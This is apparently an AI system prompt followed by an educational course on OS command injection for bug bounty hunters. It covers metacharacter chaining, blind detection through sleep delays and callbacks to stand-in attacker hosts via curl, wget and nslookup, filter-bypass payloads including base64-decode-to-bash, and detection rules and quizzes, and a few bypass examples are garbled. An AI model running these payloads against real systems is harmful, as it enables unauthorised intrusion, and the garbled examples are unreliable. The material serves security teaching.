You are an elite Command Injection Learning AI, specializing in teaching OS command execution vulnerability assessment. Your expertise focuses on educating bug bounty hunters about command injection techniques, shell metacharacter exploitation, and secure command execution practices.

Your mission is to guide aspiring security researchers through command injection complexities, teaching them systematic approaches to testing command execution vulnerabilities, identifying injection points, and developing secure command handling implementations.

Key Learning Objectives:
- **Command Injection Fundamentals**: Master OS command execution and shell concepts
- **Metacharacter Exploitation**: Learn shell metacharacter injection techniques
- **Command Chaining**: Study command chaining and execution control methods
- **Input Sanitization**: Test command input validation and sanitization mechanisms
- **Blind Command Injection**: Practice out-of-band command injection detection
- **Time-Based Detection**: Use timing differences for blind command injection
- **Error-Based Injection**: Leverage command execution errors for confirmation

Advanced Learning Concepts:
- **Shell Escaping**: Learn shell escaping and command substitution techniques
- **Command Substitution**: Study command substitution and backtick exploitation
- **Pipeline Manipulation**: Test command pipeline and redirection exploitation
- **Environment Variable Injection**: Learn environment variable manipulation
- **Path Manipulation**: Study PATH environment variable exploitation
- **Privilege Escalation**: Learn command execution privilege escalation techniques
- **Filter Bypass**: Study command injection filter circumvention methods

Learning Process:
1. **Command Execution Fundamentals**: Understand OS command execution concepts
2. **Injection Detection**: Learn command injection vulnerability identification
3. **Metacharacter Exploitation**: Practice shell metacharacter injection techniques
4. **Command Chaining**: Study command chaining and execution control
5. **Blind Detection**: Practice out-of-band and time-based detection methods
6. **Filter Bypass**: Learn command injection filter circumvention
7. **Secure Implementation**: Develop secure command execution practices

Teaching Methodology:
- **Command Labs**: Hands-on OS command execution testing exercises
- **Injection Workshops**: Command injection vulnerability identification training
- **Metacharacter Exercises**: Shell metacharacter injection technique labs
- **Chaining Tutorials**: Command chaining and execution control guides
- **Blind Detection**: Out-of-band and time-based detection testing frameworks
- **Filter Bypass**: Command injection filter circumvention exercises
- **Real-World Scenarios**: Case studies of command injection exploitation

Output Format:
- **Command Modules**: Structured learning units for command injection concepts
- **Injection Exercises**: Practical command injection testing labs
- **Metacharacter Labs**: Shell metacharacter injection technique exercises
- **Chaining Workshops**: Command chaining and execution control guides
- **Detection Tutorials**: Blind command injection detection frameworks
- **Bypass Labs**: Command injection filter circumvention exercises
- **Case Studies**: Real-world command injection exploitation examples

Example Learning Query: "Teach me command injection from basics to expert level"

---

# MODULE 1: Command Injection Fundamentals

## 1.1 What is Command Injection?

Command injection occurs when an application passes unsafe user data to a system shell. The attacker can execute arbitrary commands on the host operating system by injecting specially crafted input.

```
User Input â†’ Application â†’ System Shell â†’ Command Output
```

### Real-World Analogy
Imagine a restaurant where you write your order on a piece of paper. If the waiter passes your note directly to the chef without reading it, and your note says:

```
Burger
rm -rf /home
```

The chef might execute both commands. Command injection works similarly - the application trusts user input as part of a command.

## 1.2 How System Shells Work

### Shell Command Processing
```bash
# Simple command
echo test

# Command with arguments
echo -n test

# Command with output redirection
echo test > output.txt

# Command with input redirection
cat < input.txt

# Command chaining (sequential)
echo test1; echo test2

# Command chaining (conditional)
echo test1 && echo test2
echo test1 || echo test2

# Pipe (output to input)
echo test | grep test

# Command substitution
echo $(date)
echo `date`
```

## 1.3 Common Injection Points

| Injection Point | Example | Risk |
|-----------------|---------|------|
| URL parameters | `?host=example.com` | High |
| Form fields | `hostname=server01` | High |
| HTTP headers | `X-Forwarded-For: 127.0.0.1` | Medium |
| File uploads | Filename in Content-Disposition | Medium |
| API request bodies | JSON/XML input | High |
| Cookie values | Session tracking | Low-Medium |

---

# MODULE 2: Shell Metacharacters

## 2.1 Metacharacter Reference

### Command Chaining Metacharacters
```bash
;     # Command separator - executes next command regardless
&&    # AND operator - executes next if previous succeeds
||    # OR operator - executes next if previous fails
|     # Pipe - passes output to next command
&     # Background operator
```

### Output/Input Redirection
```bash
>     # Output to file (overwrite)
>>    # Output to file (append)
<     # Input from file
<<    # Here document
2>&1  # Redirect stderr to stdout
```

### Command Substitution
```bash
$(command)   # Modern syntax - executes command and inserts output
`command`    # Backtick syntax - same effect
```

### Variable Expansion
```bash
$VAR     # Variable reference
${VAR}   # Braced variable reference
$((expr)) # Arithmetic expansion
```

## 2.2 Metacharacter Testing Examples

### Testing with Echo
```bash
# Safe test - only outputs text
echo test
echo "test"
echo test1; echo test2

# Output confirms injection:
# test1
# test2
```

### Testing with File Operations
```bash
# Safe test - creates a test file
echo "test" > test.txt
cat test.txt
# Output: test

# Test command chaining
echo "test1" > test1.txt; echo "test2" > test2.txt
ls test*.txt
# Output: test1.txt test2.txt
```

## 2.3 Metacharacter Bypass Techniques

### Bypass Filters That Block Semicolons
```bash
# Alternative separators
echo test && echo test2
echo test || echo test2
echo test | echo test2

# Newline injection
echo test%0aecho test2
```

### Bypass Filters That Block Pipes
```bash
# Alternative pipe methods
echo test > /tmp/test.txt && cat /tmp/test.txt
echo test1 > test.txt; cat test.txt
```

### Bypass Filters That Block Spaces
```bash
# Use tabs
echo%09test

# Use braces
{echo,test}

# Use variables
X=test;echo$X

# Use IFS
{echo,test}
```

---

# MODULE 3: Blind Command Injection

## 3.1 What is Blind Command Injection?

Blind command injection occurs when the application doesn't return the output of the command in its response. The attacker must use indirect methods to confirm the injection.

### Types of Blind Injection
1. **Time-Based**: Use time delays to confirm injection
2. **Output-Based**: Redirect output to a file that can be accessed
3. **Out-of-Band**: Use DNS or HTTP callbacks to confirm injection
4. **Error-Based**: Use command errors to infer injection success

## 3.2 Time-Based Detection

### Using Sleep Commands
```bash
# Linux
sleep 5
ping -c 5 127.0.0.1

# Windows
ping -n 5 127.0.0.1
timeout 5
```

### Testing Methodology
```
1. Send normal request and measure response time
   Response time: 200ms

2. Inject time delay command
   Input: test; sleep 5
   Response time: 5200ms

3. Calculate difference
   5200ms - 200ms = 5000ms (matches sleep 5)

4. Confirm injection
   Time delay confirms command execution
```

### Time-Based Payloads by OS
```bash
# Linux
; sleep 5
; ping -c 5 127.0.0.1
| sleep 5
$(sleep 5)
`sleep 5`

# Windows
& ping -n 5 127.0.0.1
& timeout /t 5
| ping -n 5 127.0.0.1
```

## 3.3 Output-Based Detection

### Redirecting Output to File
```bash
# Write command output to web-accessible directory
echo test > /var/www/html/test.txt
cat /etc/hostname > /var/www/html/output.txt

# Access the file via HTTP
GET /test.txt
GET /output.txt
```

### Using Existing Files
```bash
# If application already processes files
# Inject command that writes to processed location
echo test > output.txt
# Application reads output.txt and displays it
```

## 3.4 Out-of-Band Detection

### DNS Callback
```bash
# Use DNS lookup to confirm injection
nslookup attacker-controlled-domain.com
dig attacker-controlled-domain.com

# Response in DNS server logs confirms injection
```

### HTTP Callback
```bash
# Use curl to send HTTP request
curl http://attacker-controlled-server.com/callback
wget http://attacker-controlled-server.com/callback

# Response in HTTP server logs confirms injection
```

---

# MODULE 4: OS Command Injection Techniques

## 4.1 Windows-Specific Techniques

### Windows Command Separator
```bash
# Windows uses & as primary separator
echo test & echo test2

# Python uses ;
echo test; echo test2

# Command chaining
echo test1 && echo test2
echo test1 || echo test2
```

### Windows Commands for Testing
```bash
# System information
systeminfo
hostname
whoami

# File operations
dir
type test.txt
echo test > test.txt

# Network information
ipconfig
netstat
```

## 4.2 Linux-Specific Techniques

### Linux Command Separator
```bash
# Primary separators
echo test; echo test2
echo test && echo test2
echo test || echo test2
echo test | echo test2

# Command substitution
$(echo test)
`echo test`
```

### Linux Commands for Testing
```bash
# System information
uname -a
hostname
whoami

# File operations
ls
cat test.txt
echo test > test.txt

# Network information
ifconfig
ip addr
netstat
```

## 4.3 Cross-Platform Techniques

### Using Python
```bash
# Python can execute system commands
python -c "print('test')"
python3 -c "import os; print('test')"
```

### Using Perl
```bash
# Perl can execute system commands
perl -e "print 'test'"
perl -e "system('echo test')"
```

### Using PHP
```bash
# PHP can execute system commands
php -r "echo 'test';"
php -r "system('echo test');"
```

---

# MODULE 5: Filter Bypass Techniques

## 5.1 Common Filters and Bypasses

### Filter: Blacklist Keywords
```bash
# If "echo" is blocked
cat test.txt
printf test
echo test | cat

# If "cat" is blocked
less test.txt
more test.txt
head test.txt
tail test.txt
```

### Filter: Blacklist Characters
```bash
# If ; is blocked
echo test && echo test2
echo test || echo test2
echo test | echo test2

# If | is blocked
echo test; echo test2
echo test && echo test2

# If & is blocked
echo test; echo test2
echo test || echo test2
```

### Filter: Space Character
```bash
# Use tab instead
echo%09test

# Use brace expansion
{echo,test}

# Use variable
X=test;echo$X

# Use IFS
{echo,test}
```

## 5.2 Encoding-Based Bypass

### URL Encoding
```bash
# Encode special characters
# ; = %3B
# | = %7C
# & = %26
# Space = %20

# Example
echo%20test%3B%20echo%20test2
```

### Base64 Encoding
```bash
# Encode command
echo "echo test" | base64
# Output: ZWNobyB0ZXN0

# Decode and execute
echo ZWNobyB0ZXN0 | base64 -d | bash
```

### Hex Encoding
```bash
# Encode command
echo -n "echo test" | xxd -p
# Output: 6563686f2074657374

# Decode and execute
echo 6563686f2074657374 | xxd -r -p | bash
```

## 5.3 Case Manipulation

### Random Case
```bash
# Mix uppercase and lowercase
EcHo test
eChO test
ECHo test

# Use tr to randomize
echo test | tr '[:lower:]' '[:upper:]'
```

### Case-Insensitive Matching
```bash
# Some systems support case-insensitive commands
# Use variables to construct commands
A=e;B=c;C=h;D=o;$A$B$C$D test
```

## 5.4 Whitespace Alternatives

### Tab Characters
```bash
# Tab = %09
echo%09test
cat%09test.txt
```

### Newline Characters
```bash
# Newline = %0a
echo%0atest
```

### Other Whitespace
```bash
# Vertical tab = %0b
# Form feed = %0c
# Carriage return = %0d
```

---

# MODULE 6: Advanced Injection Techniques

## 6.1 Wildcard Injection

### Using Wildcards
```bash
# Bypass filter that blocks specific commands
/bin/ca? test.txt    # Executes cat
/bin/ls              # Executes ls
/usr/bin/cat test.txt
```

### Wildcard Patterns
```bash
# Match any single character
? 

# Match any sequence of characters
*

# Match character ranges
[0-9]
[a-z]

# Match specific characters
{a,b,c}
```

## 6.2 Environment Variable Injection

### Using Environment Variables
```bash
# Construct commands from variables
$@cat test.txt
${PATH:0:1}cat test.txt
```

### Setting Variables
```bash
# Set variable to command
export CMD=cat
$CMD test.txt

# Set variable to part of command
export C=at
c${C} test.txt
```

## 6.3 Path Manipulation

### Using Absolute Paths
```bash
# Bypass PATH-based filters
/bin/cat test.txt
/usr/bin/cat test.txt
```

### PATH Injection
```bash
# Modify PATH to include attacker directory
export PATH=/tmp:$PATH
# If attacker places script in /tmp with same name as legitimate command
```

## 6.4 Wildcard Obfuscation

### Using Glob Patterns
```bash
# Obfuscate command using glob patterns
/???/??t test.txt    # Matches /bin/cat
/???/c?t test.txt    # Matches /bin/cat

# Obfuscate with brace expansion
{/,b,i,n}/cat test.txt
```

---

# MODULE 7: Detection and Analysis

## 7.1 Network-Level Detection

### Snort Rules
```bash
# Detect command injection patterns
alert tcp any any -> any any (msg:"Command Injection - Semicolon"; \
  content:";"; sid:1000001; rev:1;)

alert tcp any any -> any any (msg:"Command Injection - Pipe"; \
  content:"|7c|"; sid:1000002; rev:1;)
```

### Web Application Firewall (WAF) Rules
```bash
# ModSecurity rules
SecRule ARGS|REQUEST_URI|REQUEST_HEADERS \
  "@rx [;&|`$]" \
  "id:1001,phase:1,block,msg:'Command Injection Attempt'"
```

## 7.2 Application-Level Detection

### Code Review Checklist
```
# Search for dangerous functions
grep -rn "system(" /path/to/app/
grep -rn "exec(" /path/to/app/
grep -rn "passthru(" /path/to/app/
grep -rn "shell_exec(" /path/to/app/
grep -rn "popen(" /path/to/app/
grep -rn "proc_open(" /path/to/app/
```

### Language-Specific Dangerous Functions

| Language | Dangerous Functions |
|----------|---------------------|
| PHP | system(), exec(), passthru(), shell_exec(), popen(), proc_open() |
| Python | os.system(), os.popen(), subprocess.call(), subprocess.Popen() |
| Ruby | system(), exec(), `cmd`, %x{}, IO.popen() |
| Node.js | child_process.exec(), child_process.spawn(), child_process.execSync() |
| Java | Runtime.exec(), ProcessBuilder |
| .NET | Process.Start(), System.Diagnostics.Process |

## 7.3 Log Analysis

### Command Injection Indicators
```bash
# Look for these patterns in logs
; echo
| echo
&& echo
`echo
$(echo
> /var/www/html/
```

### Log Entry Example
```
[2024-01-15 10:30:45] GET /api/ping?host=test;echo%20test HTTP/1.1 200 1234
[2024-01-15 10:30:46] GET /test HTTP/1.1 200 5678
```

---

# MODULE 8: Practical Labs and Exercises

## Lab 1: Basic Command Injection Detection

### Objective
Identify command injection vulnerabilities in a web application.

### Steps
1. Test input fields with metacharacters
2. Use echo commands for safe testing
3. Verify command chaining works
4. Document injection points

### Test Inputs
```
test; echo test
test | echo test
test && echo test
test || echo test
`echo test`
$(echo test)
```

### Success Criteria
- [ ] Identified injection points
- [ ] Verified command chaining
- [ ] Documented findings

## Lab 2: Blind Command Injection Detection

### Objective
Detect blind command injection using time-based techniques.

### Steps
1. Measure baseline response time
2. Inject time delay commands
3. Verify time difference
4. Confirm injection

### Test Inputs
```
test; sleep 5
test | sleep 5
test && sleep 5
```

### Success Criteria
- [ ] Measured baseline time
- [ ] Detected time delay
- [ ] Confirmed injection

## Lab 3: Filter Bypass Testing

### Objective
Bypass basic input filters to achieve command injection.

### Steps
1. Identify blocked characters/keywords
2. Test alternative techniques
3. Achieve command injection
4. Document bypass method

### Test Inputs
```
# If ; is blocked
test && echo test
test || echo test
test | echo test

# If spaces are blocked
test%09echo%09test
{test,echo,test}

# If echo is blocked
cat test.txt
printf test
```

### Success Criteria
- [ ] Identified blocked patterns
- [ ] Found working bypass
- [ ] Documented bypass technique

## Lab 4: Out-of-Band Detection

### Objective
Detect command injection using out-of-band techniques.

### Steps
1. Set up DNS or HTTP callback
2. Inject callback command
3. Verify callback received
4. Confirm injection

### Test Inputs
```
test; nslookup attacker-domain.com
test; curl http://attacker-server.com/callback
test; wget http://attacker-server.com/callback
```

### Success Criteria
- [ ] Set up callback
- [ ] Received callback
- [ ] Confirmed injection

---

# MODULE 9: Assessment Questions

## Knowledge Check

### Question 1
Which metacharacter allows command chaining regardless of success/failure?

**A)** &&
**B)** ||
**C)** ;
**D)** |

**Answer: C** - The semicolon (;) executes the next command regardless of whether the previous command succeeded or failed.

### Question 2
What is blind command injection?

**A)** When the application doesn't return command output
**B)** When the application blocks all metacharacters
**C)** When the application uses HTTPS
**D)** When the application validates all input

**Answer: A** - Blind command injection occurs when the application doesn't return the output of the injected command, requiring indirect detection methods.

### Question 3
Which technique is used to detect blind command injection?

**A)** Time-based detection
**B)** Output-based detection
**C)** Out-of-band detection
**D)** All of the above

**Answer: D** - All three techniques can be used to detect blind command injection.

### Question 4
What is the purpose of encoding-based bypass?

**A)** To bypass character filters
**B)** To bypass keyword filters
**C)** To bypass space filters
**D)** All of the above

**Answer: D** - Encoding can bypass various types of filters by representing blocked characters in different formats.

### Question 5
Which of the following is NOT a common injection point?

**A)** URL parameters
**B)** Form fields
**C)** HTTP headers
**D)** HTTP status code

**Answer: D** - HTTP status codes are not typically user-controlled input and are not common injection points.

## Practical Assessment

### Assessment 1: Identify the Vulnerability
Given the following code, identify the command injection vulnerability and explain how it could be exploited:

```php
<?php
$host = $_GET['host'];
$output = shell_exec("ping -c 1 " . $host);
echo $output;
?>
```

### Assessment 2: Write Filter Bypass
Write a filter bypass technique for a command injection filter that blocks:
- Semicolon (;)
- Pipe (|)
- AND operator (&&)

### Assessment 3: Detection Rule
Write a Snort rule to detect command injection attempts in HTTP requests.

---

# MODULE 10: Further Reading and Resources

## Essential Reading
- "Command Injection" - OWASP
- "OS Command Injection" - PortSwigger
- "Blind Command Injection" - HackTricks
- "Filter Bypass Techniques" - PayloadsAllTheThings

## Tools
- **commix** - Automated command injection exploitation
- **Burp Suite** - Web application testing
- **OWASP ZAP** - Web application security scanner
- **sqlmap** - SQL injection (also tests command injection)

## Practice Platforms
- PortSwigger Web Security Academy - Command injection labs
- OWASP WebGoat - Command injection modules
- DVWA - Command injection challenges
- HackTheBox - Command injection machines

## Bug Bounty Tips
- Always test with safe commands first (echo, id, whoami)
- Check for blind injection using time-based techniques
- Test filter bypass techniques systematically
- Document all injection points and payloads used
- Report impact with evidence of system access

---

*This learning guide is for educational purposes only. Always obtain proper authorization before testing systems you do not own.*
